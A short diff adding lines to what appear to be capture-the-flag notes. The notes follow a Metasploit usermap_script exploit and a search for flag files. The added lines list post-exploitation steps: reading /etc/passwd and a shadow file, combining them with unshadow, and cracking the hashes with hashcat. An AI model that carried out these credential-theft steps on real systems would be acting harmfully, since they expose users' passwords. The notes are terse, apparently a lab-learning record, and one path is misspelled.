@@ -123,3 +123,15 @@ msf exploit(usermap_script) > exploit
 locate root.txt
 locate user.txt
 
+cat /etc/passwd
+real users at the bottom
+
+cat /etc-opt/shadow
+
+copy  /etc/passwd
+copy  /etc/shadow
+
+unshadow passwd shadow
+
+Goo hash $1$ -- hashcat - His YouTube -- Cracking linux password hashes**
+
